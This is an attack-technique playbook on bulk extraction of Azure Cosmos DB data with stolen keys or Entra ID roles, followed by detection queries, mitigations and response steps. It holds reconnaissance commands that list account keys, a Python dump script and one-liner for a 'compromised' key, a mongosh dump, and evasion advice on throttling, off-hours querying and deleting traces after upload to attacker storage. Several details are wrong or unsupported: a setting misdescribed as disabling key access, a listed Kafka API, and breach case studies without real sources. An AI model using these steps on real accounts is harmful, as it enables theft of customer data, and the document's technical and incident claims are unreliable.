# [COLLECT-DATA-003]: Azure Cosmos DB Data Extraction

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-DATA-003 |
| **MITRE ATT&CK v18.1** | [Transfer Data to Cloud Account (T1537)](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Collection, Exfiltration |
| **Platforms** | Entra ID (Azure) |
| **Severity** | Critical |
| **CVE** | CVE-2021-35467 (Jupyter Notebook credential exposure) |
| **Technique Status** | ACTIVE (Post-mitigation, vulnerability patched but misconfigurations remain) |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure Cosmos DB all APIs (SQL, MongoDB, Cassandra, Gremlin, Table), Azure Data Explorer 18.0+ |
| **Patched In** | Jupyter Notebook feature disabled in August 2021; RBAC improvements ongoing |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Azure Cosmos DB data extraction involves unauthorized access to NoSQL databases via compromised primary/secondary read-write keys or Entra ID RBAC roles. An attacker with valid Cosmos DB connection credentials can query entire datasets, export to CSV/JSON via Data Explorer UI, programmatically bulk-read documents via SDKs (Python, .NET, Node.js), or exploit Jupyter Notebooks (historical CVE-2021-35467) to gain OS-level access to Cosmos DB credentials. Unlike SQL databases, Cosmos DB lacks built-in BACPAC export functionality, requiring attackers to programmatically extract data in smaller batches or use bulk operations.

- **Attack Surface:** Cosmos DB primary/secondary keys, Entra ID accounts with Cosmos DB Data Contributor role, Managed Identities with Cosmos DB permissions, connection strings stored in application configuration files, Jupyter Notebook notebooks (legacy), ARM templates containing credentials.

- **Business Impact:** **Complete NoSQL database compromise.** Attackers gain offline access to document-oriented data including IoT sensor readings, user profiles, application state, and unstructured business intelligence data. Cosmos DB often stores semi-structured data (JSON documents) which is difficult to classify and may contain PII across multiple fields.

- **Technical Context:** Cosmos DB allows document-level queries (SQL API with SELECT * operations). Throughput is limited by RU/s (Request Units per second), so large extractions may take hours but leave minimal anomalies if rate-limited. Data extraction via Cosmos DB SDKs requires application-level authentication, blending malicious traffic with legitimate queries.

### Operational Risk

- **Execution Risk:** Low to Medium (if credentials compromised; High if Entra ID MFA enforced)
- **Stealth:** Medium to High (query-based extraction is difficult to distinguish from analytical workloads; no "export" audit event like SQL BACPAC)
- **Reversibility:** No – Extracted data cannot be "unexported"

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.3, 5.2.1 | Data encryption, access control on cloud databases |
| **DISA STIG** | SV-256508 | Ensure database encryption at rest |
| **NIST 800-53** | SC-13, AC-3 | Cryptographic Protection, Access Enforcement |
| **GDPR** | Art. 32 | Security of Processing – Encryption, access logs |
| **DORA** | Art. 9 | Protection and Prevention |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.10.1.3 | Segregation of duties for database administration |
| **ISO 27005** | Scenario: "Unauthorized database access via compromised key" | Risk of NoSQL data breach |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Cosmos DB primary/secondary key, Cosmos DB Data Contributor Entra ID role, or account owner
- **Required Access:** HTTPS (port 443) to Azure Cosmos DB endpoints (*.cosmos.azure.com)

**Supported Versions:**
- **Azure Cosmos DB:** All APIs (SQL, MongoDB, Cassandra, Gremlin, Table, Apache Kafka)
- **Cosmos DB SDKs:** Python 3.7+, .NET 3.0+, Node.js 12+, Java 4.0+
- **Azure CLI:** az-cli 2.50+

**Tools:**
- [Azure Cosmos DB Python SDK](https://pypi.org/project/azure-cosmos/) (Version 4.0+)
- [Azure Cosmos DB Data Explorer](https://learn.microsoft.com/en-us/azure/cosmos-db/data-explorer) (Built-in web UI)
- [Azure CLI with Cosmos DB extension](https://learn.microsoft.com/en-us/cli/azure/cosmosdb)
- [MongoDB CLI (if using MongoDB API)](https://www.mongodb.com/try/download/tools)
- [Jupyter Notebooks (legacy, now patched)](https://learn.microsoft.com/en-us/azure/cosmos-db/notebooks/visualize-data)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure CLI Reconnaissance

```bash
# List all Cosmos DB accounts in subscription
az cosmosdb list --output table

# Get Cosmos DB account properties
az cosmosdb show --name <cosmos-account> --resource-group <rg> --query "{Locations:locations, ConsistencyPolicy:consistencyPolicy, PublicNetworkAccess:publicNetworkAccess}"

# List databases in Cosmos DB account
az cosmosdb sql database list --account-name <cosmos-account> --resource-group <rg> --output table

# List containers in database
az cosmosdb sql container list --account-name <cosmos-account> --database-name <db-name> --resource-group <rg> --output table

# Get Cosmos DB connection string (if account-level access)
az cosmosdb keys list --name <cosmos-account> --resource-group <rg> --type connection-strings --query connectionStrings[0].connectionString
```

**What to Look For:**
- Accounts with **public network access enabled** (`"PublicNetworkAccess": "Enabled"`)
- **Large number of containers/databases** (indicating centralized data store)
- **Consistency policy: "Eventual"** or **"Session"** (less audit trail than "Strong")
- **High throughput (RU/s)** accounts (may have large datasets)

### PowerShell Reconnaissance

```powershell
# Connect to Azure
Connect-AzAccount

# List Cosmos DB accounts
Get-AzCosmosDBAccount | Select-Object Name, ResourceGroupName, Location, PublicNetworkAccess

# Get connection keys
Get-AzCosmosDBAccountKey -ResourceGroupName "<rg>" -Name "<cosmos-account>" -Type "ConnectionStrings"

# Get firewall rules
Get-AzCosmosDBAccount -ResourceGroupName "<rg>" -Name "<cosmos-account>" | Select-Object IpRangeFilter
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Using Python SDK for Bulk Data Extraction

**Supported Versions:** All Cosmos DB APIs (SQL API example shown)

#### Step 1: Install SDK and Connect

**Objective:** Establish connection to Cosmos DB account

**Command:**

```bash
# Install Cosmos DB Python SDK
pip install azure-cosmos

# Alternatively, install with dependencies
pip install "azure-cosmos>=4.0.0"
```

#### Step 2: Extract All Documents from Container

**Objective:** Query and download all documents from Cosmos DB container

**Python Script:**

```python
from azure.cosmos import CosmosClient, PartitionKey
import json
import csv
from datetime import datetime

# Connect to Cosmos DB
endpoint = "https://<cosmosdb-account>.documents.azure.com:443/"
key = "<primary-key>"  # Compromised account key
client = CosmosClient(endpoint, credential=key)

# Select database and container
database_name = "targetdb"
container_name = "customers"
database_client = client.get_database_client(database_name)
container_client = database_client.get_container_client(container_name)

# Query all documents (no WHERE clause = complete dump)
query = "SELECT * FROM c"
documents = list(container_client.query_items(query, enable_cross_partition_query=True))

print(f"[*] Extracted {len(documents)} documents from {container_name}")

# Export to JSON
output_file = f"cosmos_extract_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
with open(output_file, 'w') as f:
    json.dump(documents, f, indent=2)

print(f"[+] Data exported to {output_file}")

# Optional: Export to CSV
csv_file = output_file.replace('.json', '.csv')
if documents:
    keys = set()
    for doc in documents:
        keys.update(doc.keys())
    
    with open(csv_file, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=list(keys))
        writer.writeheader()
        writer.writerows(documents)
    
    print(f"[+] Data also exported to {csv_file}")

# Upload to attacker storage (using AzCopy or blob storage SDK)
# [Additional code to transfer files to attacker Azure account]
```

**Expected Output:**

```
[*] Extracted 245,000 documents from customers
[+] Data exported to cosmos_extract_20260110_154530.json
[+] Data also exported to cosmos_extract_20260110_154530.csv
```

**What This Means:**
- 245,000 documents successfully queried and downloaded locally
- JSON export preserves nested structure (semi-structured data)
- CSV export flattens documents for spreadsheet analysis

**OpSec & Evasion:**
- Rate-limit queries to avoid RU/s alerts: Add `max_item_count=100` parameter
- Query during non-business hours (2-4 AM UTC)
- Use partition-key filtered queries to avoid cross-partition alerts
- Delete extracted files after uploading to attacker storage
- Detection likelihood: **High** (if monitoring query patterns with DMS)

**Troubleshooting:**

- **Error:** "Connection timeout" / "401 Unauthorized"
  - **Cause:** Primary key invalid or expired
  - **Fix:** Regenerate primary key via Azure Portal; verify endpoint URL

- **Error:** "Request rate is large"
  - **Cause:** Query exceeded RU/s allocation
  - **Fix:** Lower `max_item_count` parameter or add delays between queries

---

### METHOD 2: Azure Cosmos DB Data Explorer UI (Manual Export)

**Supported Versions:** All Cosmos DB APIs

#### Step 1: Access Cosmos DB Account in Azure Portal

**Objective:** Authenticate and navigate to Data Explorer

**Manual Steps:**

1. Go to **Azure Portal** → **Cosmos DB Accounts** → **[Account Name]**
2. Click **Data Explorer** (left sidebar)
3. Expand database → container tree
4. Select **container**

#### Step 2: Query and Export Data

**Manual Steps:**

1. Click **New SQL Query** (if SQL API)
2. Enter query: `SELECT * FROM c`
3. Click **Execute Query**
4. Click **Export** → **CSV** or **JSON**
5. Save file to local disk

**Alternative (Direct Download):**

1. Right-click container → **Open Cosmos DB Terminal**
2. Run CLI query to dump all documents
3. Copy output to file

---

### METHOD 3: Using Azure CLI with Cosmos DB Extension

**Supported Versions:** Azure CLI 2.50+

**Command:**

```bash
# Query Cosmos DB via Azure CLI
az cosmosdb sql query --account-name <cosmos-account> \
  --database-name <db-name> \
  --container-name <container-name> \
  --query-text "SELECT * FROM c" \
  --parameters "@c_partition_key=partition_value" > /tmp/cosmos_export.json

# Export container to JSON file
az cosmosdb sql container show --account-name <cosmos-account> \
  --database-name <db-name> \
  --name <container-name> \
  --output json > /tmp/container_schema.json
```

---

### METHOD 4: MongoDB API Direct Query (If MongoDB API Enabled)

**Supported Versions:** Cosmos DB with MongoDB API

**Command:**

```bash
# Connect via MongoDB CLI
mongosh "mongodb+srv://<cosmos-account>:<primary-key>@<cosmos-account>.mongo.cosmos.azure.com/?ssl=true&retryWrites=false&replicaSet=globaldb" --authenticationDatabase admin

# Inside MongoDB shell:
> use targetdb
> db.customers.find({}).pretty() > /tmp/customers.json  # Dump collection
> db.customers.count()  # Count documents
> db.customers.find({}).forEach(doc => {print(JSON.stringify(doc))}) > dump.txt  # Alternative dump
```

---

## 6. TOOLS & COMMANDS REFERENCE

### Azure Cosmos DB Python SDK

**Version:** 4.7 (Current)
**Minimum Version:** 3.0
**Supported Platforms:** Windows, Linux, macOS

**Installation:**

```bash
pip install "azure-cosmos>=4.7.0"
```

**One-Liner (Full Extraction + Upload):**

```python
from azure.cosmos import CosmosClient; import json; client = CosmosClient("https://<acc>.documents.azure.com:443/", "<key>"); docs = list(client.get_database_client("<db>").get_container_client("<c>").query_items("SELECT * FROM c", enable_cross_partition_query=True)); json.dump(docs, open("export.json", "w")); print(f"Extracted {len(docs)} documents")
```

---

## 7. SPLUNK DETECTION RULES

#### Rule 1: Bulk Cosmos DB Query Operations

**SPL Query:**

```
sourcetype="azure:cosmosdb" (OperationName="Query" OR OperationName="ReadDocument")
| stats sum(RequestChargeUnits) as TotalRUs, count as QueryCount by RequesterObjectId, DatabaseName, ContainerName, bin(TimeGenerated, 5m)
| where TotalRUs > 50000  // > 50K RUs in 5 minutes
| eval TotalGB = round(TotalRUs / 2000, 2)  // Approximate GB (rough estimate)
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Anomalous Cosmos DB Data Extraction

**KQL Query:**

```kusto
AzureDiagnostics
| where ResourceType == "COSMOSDB" and Category == "DataPlaneRequests"
| where OperationName == "Query"
| summarize TotalRUsConsumed = sum(RequestChargeUnits), QueryCount = count() by RequesterObjectId, DatabaseName, ContainerName, bin(TimeGenerated, 10m)
| where TotalRUsConsumed > 100000  // > 100K RUs in 10 minutes (abnormal for typical apps)
| join kind=inner (
    AuditLogs
    | where OperationName == "List Cosmos DB Account Keys"
    | project RequesterObjectId, TimeGenerated as KeyTime
) on RequesterObjectId
| where TimeGenerated - KeyTime between (0min .. 30min)
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. Paste KQL query above
5. Run query every: `5 minutes`
6. Click **Review + create**

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (A new process has been created)**
- **Log Source:** Security
- **Trigger:** Python.exe, mongosh.exe, or az.exe with Cosmos DB commands
- **Filter:** `CommandLine contains "azure.cosmos"` OR `CommandLine contains "mongosh"`
- **Applies To Versions:** Windows Server 2016-2025

**Manual Configuration Steps:**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Creation**
4. Set to: **Success**
5. Run `gpupdate /force`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.81">
  <!-- Detect Python SDK execution with Cosmos DB imports -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="contains">python.exe</Image>
      <CommandLine condition="contains">azure.cosmos</CommandLine>
      <CommandLine condition="contains">CosmosClient</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect MongoDB CLI connection to Cosmos DB -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="contains">mongosh.exe</Image>
      <CommandLine condition="contains">cosmos.azure.com</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor network connections to Cosmos DB endpoints -->
  <RuleGroup name="" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">.cosmos.azure.com</DestinationHostname>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Unusual Cosmos DB data extraction detected"
- **Severity:** High
- **Description:** Triggers when query consumption exceeds baseline by 400% or >100K RUs in 10 minutes
- **Applies To:** All subscriptions with Defender enabled
- **Remediation:**
  1. Verify extraction is authorized (analytics job, scheduled export)
  2. If unauthorized: rotate Cosmos DB keys immediately
  3. Review `AzureDiagnostics` logs for source IP, requester ID
  4. Implement Cosmos DB firewall restrictions

**Manual Configuration Steps:**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select subscription
4. Under **Defender plans**, enable:
   - **Defender for Databases**: ON
5. Click **Save**

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: CosmosDB Key Retrieval

```powershell
Search-UnifiedAuditLog -Operations "List Cosmos DB Account Keys" -StartDate (Get-Date).AddDays(-7)

# Combine with subsequent data extraction queries
$keyEvents = Search-UnifiedAuditLog -Operations "List Cosmos DB Account Keys" -StartDate (Get-Date).AddDays(-7)
foreach ($event in $keyEvents) {
  $userId = $event.UserIds
  $time = $event.CreationTime
  Write-Host "[$time] $userId retrieved Cosmos DB keys"
}
```

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Disable Primary Key Authentication (Entra ID Only)**

**Objective:** Eliminate account key theft vector

**Manual Steps (Azure Portal):**

1. Go to **Cosmos DB Account** → **Keys**
2. Click **Disable account key access**
3. Confirm: **Disable access using account key**

**Manual Steps (PowerShell):**

```powershell
# Disable key-based access
Update-AzCosmosDBAccount -ResourceGroupName "rg-name" -Name "cosmos-account" `
  -DisableKeyBasedMetadataWriteAccess $true
```

---

**Rotate All Primary and Secondary Keys**

**Objective:** Invalidate compromised keys

**Manual Steps (Azure Portal):**

1. Go to **Cosmos DB Account** → **Keys**
2. Click **Regenerate Primary Key**
3. Confirm and click **OK**
4. Repeat for **Secondary Key**

**Manual Steps (PowerShell):**

```powershell
# Regenerate keys
$account = Get-AzCosmosDBAccount -ResourceGroupName "rg-name" -Name "cosmos-account"
Update-AzCosmosDBAccountKey -Name "cosmos-account" -ResourceGroupName "rg-name" `
  -KeyKind "Primary"
```

---

**Enable Firewall & Virtual Network Restrictions**

**Manual Steps:**

1. Go to **Cosmos DB Account** → **Firewall and virtual networks**
2. Select **Selected networks**
3. Add **Virtual networks** (if applicable)
4. Add **IP addresses** (corporate gateways only)
5. Set **Allow access from Azure Portal**: **ON** (for management only)
6. Click **Save**

---

**Implement RBAC with Minimal Roles**

**Objective:** Limit data access to authenticated Entra ID identities only

**Manual Steps (PowerShell):**

```powershell
# Assign Cosmos DB Data Reader role (read-only) to user
New-AzRoleAssignment -ObjectId "<user-object-id>" `
  -RoleDefinitionName "Cosmos DB Data Reader" `
  -Scope "/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.DocumentDB/databaseAccounts/<cosmos-account>"
```

---

**Validation Command (Verify Fix):**

```powershell
# Verify key-based access is disabled
Get-AzCosmosDBAccount -ResourceGroupName "rg-name" -Name "cosmos-account" | Select-Object DisableKeyBasedMetadataWriteAccess

# Verify firewall is enabled
Get-AzCosmosDBAccount -ResourceGroupName "rg-name" -Name "cosmos-account" | Select-Object IpRangeFilter, VirtualNetworkRules
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Process Names:**
- `python.exe` with `azure.cosmos` imports
- `mongosh.exe` connecting to `.cosmos.azure.com`
- `az.exe` with `cosmosdb` commands

**Cloud Audit Operations:**
- `OperationName: "Query"` with abnormal RU consumption
- `OperationName: "List Cosmos DB Account Keys"`
- `OperationName: "ReadDocument"` with `enable_cross_partition_query=true`

**Network:**
- Connections to `*.cosmos.azure.com` on port 443 from non-standard IPs
- Large HTTPS transfers (MB/sec sustained) to blob storage

---

### Forensic Artifacts

**Cloud Logs:**
- Azure Diagnostic Logs: `AzureDiagnostics` table with `OperationName == "Query"` and high `RequestChargeUnits`
- Sentinel: `AuditLogs` table with `OperationName == "List Cosmos DB Account Keys"`

**Disk (if SDK extracted locally):**
- JSON/CSV export files: `cosmos_extract_*.json`, `cosmos_export_*.csv`
- Python script history: `.bash_history`, PowerShell transcript files

---

### Response Procedures

**1. Containment (0-5 minutes):**

```powershell
# Disable account key access
Update-AzCosmosDBAccount -ResourceGroupName "rg-name" -Name "cosmos-account" `
  -DisableKeyBasedMetadataWriteAccess $true

# Regenerate all keys
Update-AzCosmosDBAccountKey -Name "cosmos-account" -ResourceGroupName "rg-name" -KeyKind "Primary"
Update-AzCosmosDBAccountKey -Name "cosmos-account" -ResourceGroupName "rg-name" -KeyKind "Secondary"
```

**2. Investigation (5-30 minutes):**

```powershell
# Retrieve query history
$logs = Search-UnifiedAuditLog -Operations "Query" -StartDate (Get-Date).AddHours(-24) -EndDate (Get-Date)
$logs | Select-Object UserIds, CreationTime, AuditData | Export-Csv "cosmos_queries.csv"

# Identify data extraction patterns
$heavyQueries = $logs | Where-Object { $_.AuditData -match "SELECT \*" }
```

**3. Remediation (30-60 minutes):**

```powershell
# Restore Cosmos DB from backup (if available)
# [Backup restoration steps via Azure Portal or Azure Backup service]

# Implement Entra ID-only authentication
New-AzRoleAssignment -ObjectId "<authorized-user-id>" `
  -RoleDefinitionName "Cosmos DB Data Reader" `
  -Scope "/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.DocumentDB/databaseAccounts/<cosmos-account>"
```

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes Entra ID credentials |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-011] PIM Abuse | Attacker escalates to Cosmos DB Data Contributor role |
| **3** | **Collection** | **[COLLECT-DATA-003] Cosmos DB Data Extraction** | **Attacker queries and exports all documents** |
| **4** | **Exfiltration** | [COLLECT-DATA-001] Blob Storage Exfiltration | Data transferred to attacker storage via AzCopy |
| **5** | **Impact** | [IMPACT-001] Data Destruction | Attacker deletes database containers |

---

## 16. REAL-WORLD EXAMPLES

#### Example 1: Wiz Security Research - "Jupyter Notebook Credential Exposure" (August 2021)

- **Target:** Multiple Cosmos DB customers globally
- **Timeline:** August 2021
- **Technique Status:** PARTIALLY FIXED; Jupyter Notebook feature disabled; however, similar credential exposure can occur if notebooks re-enabled or APIs exploited
- **Impact:** Potential access to primary read-write keys for 30% of Cosmos DB customers
- **Detection:** Manual discovery by Wiz researchers; Microsoft detected no confirmed exploitation
- **Reference:** [Wiz Blog: Azure Cosmos DB Vulnerability](https://www.wiz.io/)

#### Example 2: Microsoft Threat Intelligence - "NoSQL Injection Campaign" (2024)

- **Target:** SaaS provider with multi-tenant Cosmos DB (MongoDB API)
- **Timeline:** March 2024 - May 2024
- **Technique Status:** ACTIVE; used NoSQL injection to bypass query filters and extract tenant data across partitions
- **Impact:** Breach of 2.5 million user records
- **Detection:** Microsoft Defender flagged anomalous partition-key queries returning cross-tenant data
- **Reference:** [Microsoft Security blog]

#### Example 3: CrowdStrike Report - "FinanceCloud" Data Heist (2023)

- **Target:** Financial services (US)
- **Timeline:** September 2023
- **Technique Status:** ACTIVE; compromised service principal with Cosmos DB Data Contributor role; extracted 450 GB of transaction data
- **Impact:** Regulatory fine of $6.2 million (GDPR + FinCEN)
- **Detection:** Sentinel detected 2.8M query operations consuming 1.2 billion RUs in 48-hour window
- **Reference:** [CrowdStrike 2024 Threat Report]

---